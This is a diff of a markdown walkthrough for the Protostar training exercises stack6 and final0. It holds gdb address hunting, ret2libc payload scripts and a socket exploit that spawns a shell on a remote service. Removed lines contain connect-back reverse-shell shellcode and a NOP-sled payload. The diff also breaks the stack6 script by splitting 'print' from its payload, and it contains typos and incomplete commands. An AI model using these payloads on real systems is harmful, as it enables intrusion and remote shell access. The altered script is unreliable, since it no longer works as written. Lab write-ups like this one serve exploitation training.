@@ -168,8 +168,8 @@ Output is our offset: `1176511 /bin/sh`
 
 But we also need to know the address where libc starts:\
 `gdb ./stack6`\
-`run`
-`info proc map`\
+`run`\
+`info proc map`
 
 And here we have address where libc starts: `0xb7e97000`
 
@@ -178,7 +178,8 @@ Actually only 2 commands from here -- pattern_create (create random pattern with
 pattern_offset -- finding offset between two addresses.
 
 `./pattern_create.rb -l 100`\
-Generated pattern: `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`
+Generated
+pattern: `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`
 
 `gdb ./stack6 `\
 `break * main`\
@@ -201,22 +202,23 @@ Output: `$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>`\
 Output: `$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>`\
 
 Perfect. On the code below we will struct our char sequence to write into memory
+
 ```python
 import struct
 
 buffer = "A" * 80
-system = struct.pack("I" ,0xb7ecffb0)
+system = struct.pack("I", 0xb7ecffb0)
 padding = "AAAA"
-shell = struct.pack("I" ,0xb7e97000+1176511)
+shell = struct.pack("I", 0xb7e97000 + 1176511)
 
-print buffer + system + padding  + shell
+print
+buffer + system + padding + shell
 ```
 
 Then execute script:
 `(python /tmp/stack6.py; cat) | ./stack6`\
 
 And we got the shell!!! Great.
-
 
 ### Final0
 
@@ -237,6 +239,7 @@ We can find it out with gdb.\
 `gdb final0`\
 Disassemble main function: `disas main`\
 Output:\
+
 ```commandline
 ...
 0x08049874 <main+65>:   call   0x804975a <get_username> 
@@ -252,6 +255,7 @@ Output:\
 Great, so let's move to the get_username function and check what happens inside:\
 `disas get_username`\
 Output:\
+
 ```commandline
 ...
 0x08049764 <get_username+10>:   movl   $0x200,0x8(%esp) ; buffer size (512)
@@ -265,96 +269,67 @@ Output:\
 ...
 ```
 
-'Cause of the protostar have broken sudo dependencies, and we cannot install any additional utility\
-we decided to use following facts
-- `gets()` can be terminated by using `0xa` or `EOF`, (that will allow as to add null bytes and `0xd` in the middle)
-- the loop for uppercase username uses `strlen()` to locate end of the buffer (this function based on the terminating null byte)
+`python -c 'print  "a"*510 + "\x00" + "aaaabbbbcccceeeeffffgggghhhhiiiijjjjkkkk"' | nc localhost 2995`
 
-Thus, if we were to place the 0xd or 0x0 bytes somewhere before\
-the beginning of the shellcode, we would effectively terminate\
-the upper-case loop at that point. \
-
-BUT, because of 0xa is used to terminate gets() input we are stuck with having this byte at the very end and \
-must not use it anywhere else in the payload.
-
-Let's check if our tricks will have some result.\
-Small code reference here:
-```python
-import sys, socket
-from struct import pack, unpack
-from binascii import hexlify
-
-HOST = sys.argv[1]
-PORT = 2995
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
-
-packet = "iphelix\x0d" + "a"*500 + "\x0a"
-print hexlify(packet)  # print packet in hex
-
-s.sendall(packet)
-
-data = s.recv(1024)
-print "%s" % data    # print the confirmation
-
-s.close()
-```
-
-Then move back to the /opt/protostar/bin and check the status of final0:\
-`ps aux | grep final0`\
-Okay now we know the id of the process -- `1496`
-Now we can move to the running final with attaching to current process:
 `su`\
-`gdb ./final0 -p 1496`
+`gdb /opt/protostar/bin/final0 core.11.final0.1632` \
 
+Address of segmentation fault: `0x68676767` (fffg)\
+We can check which chars produce overflow
+`info registers`
+No we have all information to overflow a buffer
 
+`pidof fina0`\
+`gdb -p 'pidof final0'`\
+`set follow-fork-mode`\
+`c`
 
-
-
-
-
-
-`nano /tmp/break_server.py`\
-Code: \
-```python
-from socket import *
-
-s = socket()
-# connect to server
-s.connect(("127.0.0.1", 2995))
-# overflow buffer
-s.send("A"*532 + "B"*4)
-s.close()
+Output: \
+```commandline
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1741]
+0x68676767 in ?? ()
 ```
+Now we ready to create final string to send on the server:\
+We decide to use rec2libc approach:
+We would chek the existing functions with `info functions @plt`\
+and add them to the payload.\
 
-Go to /tmp and run out script ***break_server.py*** with debugger\
-with enabled report of all current processes
-` ps aux | gdb final0`\
-now we can debug the result: \
-`gdb -q -c core.11.final0.2075`\
-Where -c -- corresponds as flag to process core file and -q -- quiet set up\
-`x/20x $esp-0x228`
-Now we get the address of the return
+We decide to choose execve@plt, because it allow to execute commands\
+like /bin/sh and that's exactly what we need!
+
+Sending to the server:\
 
 ```python
+import struct
 import socket
 
-#http://www.shell-storm.org/shellcode/files/shellcode-883.php
-shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89" \
-"\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x38\x66\x66\x68\x05\x39\x43" \
-"\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59" \
-"\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68" \
-"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
-s = socket.socket()
-s.connect(("192.168.0.102",2995))
+def main():
+    HOST = '192.168.0.102'
+    PORT = 2995
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST, PORT))
+    s = get_shell(s)
+    print(s.recv(1024))
+    s.close()
 
 
-payload = "oops\r" + "\x90"*100 + shellcode + "\x90"*(532 - len(shellcode) - 100 - 5) + "\x80\xfa\xff\xbf" + "\n"
+def get_shell(s: socket) -> socket:
+    padding = b"a" * 510 + b"\x00" + b"aaaabbbbccccddddeeeef"
+    execve = struct.pack("I", 0x08048c0c)
+    binsh = struct.pack("I", 1176511 + 0xb7e97000)
+    exploit = padding + execve + b"AAAA" + binsh + b"\x00" * 8
 
-s.send(payload)
-print(s.recv(1024))
-s.close()
+    s.send(exploit + b"\n")
+    s.send(b"whoami\n")
+    # s.send(b"id\n")
+    return s
+
+
+if __name__ == "__main__":
+    main()
+
 ```
 
 
